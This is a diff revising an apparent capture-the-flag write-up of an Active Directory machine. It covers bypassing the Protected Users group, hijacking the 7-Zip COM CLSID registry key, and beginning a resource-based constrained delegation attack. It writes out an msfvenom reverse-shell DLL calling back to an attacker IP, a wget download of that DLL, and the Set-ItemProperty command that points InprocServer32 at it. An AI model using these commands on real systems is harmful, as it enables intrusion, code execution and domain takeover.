@@ -100,7 +100,7 @@ Next, leveraging the HelpDesk group permissions, we reset the password for the u
 
 <img width="662" height="45" alt="image" src="https://github.com/user-attachments/assets/4a9131f3-c39f-4ee7-af87-fb7e453f96ef" />
 
-## Bypassing the Protected Users Group
+## 4. Bypassing the Protected Users Group
 When attempting to request a TGT for `BB.MORGAN`, we encounter an error because the user belongs to the Protected Users group, which enforces stricter security policies (e.g., no NTLM, restricted delegation).
 More info: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group
 
@@ -120,23 +120,24 @@ We can now successfully request the TGT and access the system.
 
 ## 4. COM Hijacking
 
-When we access the system via WinRM, we find a PDF file. The keywords in it are "extraction/compression", which clearly indicates software for managing archives (zip, rar). Windwows uses COM objects to allow different programs to share functionality. For example, when you  right-click and select “Extract”, wndows doesn't natively know how to unzip it. Instead, it consults the Registry by looking for a unique code called CLSID. The CLSID tells it: "To openthis file, load this specific DLL". So, if we can identify which CLSID is used for zip file and have the permissions to modify uts value in the registry, we can replace the path to the legitimate DLL with that of a malicius DLL.
+During enumeration of Morgan's accessible files, we find a PDF referencing "extraction/compression," hinting at archive management software (like 7-Zip).
+Windows uses COM (Component Object Model) objects to allow programs to share functionality. When interacting with an archive, Windows looks up a unique identifier called a CLSID in the Registry to find the specific DLL needed to handle the action. If we can identify the CLSID for the zip handler and have write permissions over its registry key, we can replace the legitimate DLL path with a malicious one.
 
 <img width="752" height="372" alt="image" src="https://github.com/user-attachments/assets/3b70c224-a49e-4093-8420-3c71fa818ebc" />
 
-Now we need to find the exact CLSID associated with 7-Zip in the Windows Registry.
+We search for the exact CLSID associated with "zip":
 
 `reg query HKCR\CLSID /s /f "zip"`
 
 <img width="629" height="55" alt="image" src="https://github.com/user-attachments/assets/50ad7c0a-98db-43cc-a543-3447cc14f54d" />
 
-Now that we have found the registry key, we need to figure out who has permission to edit it.
+Checking the permissions on the identified registry key:
 
 `C:\Program Files> Get-Acl -Path "HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}" | Format-List`
 
 <img width="1333" height="241" alt="image" src="https://github.com/user-attachments/assets/4d3c0d62-f5b1-47cb-9f4b-42c2d98e7c1b" />
 
-We find that the Support group has full control; the user morgan is not a meber of this group, so they cannot modify the key. Let's check the group members on Bloodhound
+We discover that the Support group has Full Control. Morgan is not a member, but we can repeat our previous Active Directory manipulation to take control of a user in the Support group, EE.REED.
 
 <img width="919" height="253" alt="image" src="https://github.com/user-attachments/assets/96a30e2c-4b58-4e33-ad55-2970d945f932" />
 
@@ -163,7 +164,7 @@ Later, I tried requesting a TGT for REED and got it, but I couldn't figure out w
 
 <img width="533" height="146" alt="image" src="https://github.com/user-attachments/assets/2e1580c2-80a8-4e97-8e00-551d7b9ac7bc" />
 
-Now we need to create our malicious DLL
+Next, we generate a malicious DLL using msfvenom, transfer it to the target (C:\ProgramData\rev.dll), and overwrite the InprocServer32 registry key:
 
 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.142 LPORT=9001 -f dll -o rev.dll`
 
@@ -171,7 +172,6 @@ Now we need to create our malicious DLL
 
 `wget http://10.10.14.142:8000/rev.dll -o rev.dll`
 
-## COM Hijacking 
 Now for the most important part: edit the path stored in the InprocServer32 registry key (under the 7-Zip CLSID), changing the default value from the original DLL to C:\ProgramData\rev.dll.
 `Set-ItemProperty -Path "HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -Name "" -Value "C:\ProgramData\rev.dll"`
 
@@ -179,11 +179,14 @@ By replacing the value of the InprocServer32 subkey (which normally points to th
 
 <img width="539" height="220" alt="image" src="https://github.com/user-attachments/assets/571ca21a-5986-4138-91a5-35f28f30a7ab" />
 
+## 6. Domain Compromise (RBCD)
+
 We've gained a Turner user shell; let's see what we can do with it using Bloodhound
 
 <img width="805" height="328" alt="image" src="https://github.com/user-attachments/assets/49554540-dab3-4fd1-bea1-cf6faa52148d" />
 
-Turner is part of the Delegation Manager group, which has a special permission called “AllowedToAct” directly on the Domain Controller (DC) object.This allows an attacker to carry out an advanced attack known as Resource-Based Constrained Delegation (RBCD). In short, this attack allows the attacker to tell the domain controller: “Hey, from now on, you have to trust the ‘IT Computer 3’ account”
+Enumerating Turner in BloodHound reveals they are part of the Delegation Manager group, which possesses the AllowedToAct permission over the Domain Controller object. This is the exact setup required for a Resource-Based Constrained Delegation (RBCD) attack.
+RBCD allows us to configure the Domain Controller to trust a specific computer account (in this case, our already compromised IT-COMPUTER3$) for delegation.
 
 `Get-ADUser administrator -Properties *`
 
